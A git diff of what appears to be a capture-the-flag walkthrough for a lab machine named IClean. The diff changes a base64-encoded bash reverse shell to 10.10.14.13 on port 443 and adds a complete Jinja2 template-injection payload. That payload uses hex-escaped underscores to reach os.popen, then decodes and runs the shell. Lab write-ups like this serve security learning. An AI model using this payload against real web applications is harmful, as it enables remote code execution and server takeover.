@@ -278,16 +278,18 @@ In this case, the typical bash Reverse Shell doesn't work, I think it's because 
 <br />
 
 ```bash
-❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"' | base64 -w 0; echo
-YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMSI=
+❯ echo 'bash -c  "bash -i >& /dev/tcp/10.10.14.13/443  0>&1"' | base64 -w 0; echo
+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=
 ```
 
 <br />
 
 Once we have our payload encoded, we will simply have to enter it into the jinja payload and listen on port 443 to receive the connection when sending the request to the server:
 
+Final Payload -> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=|base64+-d|bash')|attr('read')()}}
+
 <br />
 
-
+![19](../../../assets/images/IClean/19.png)
 
 <br />
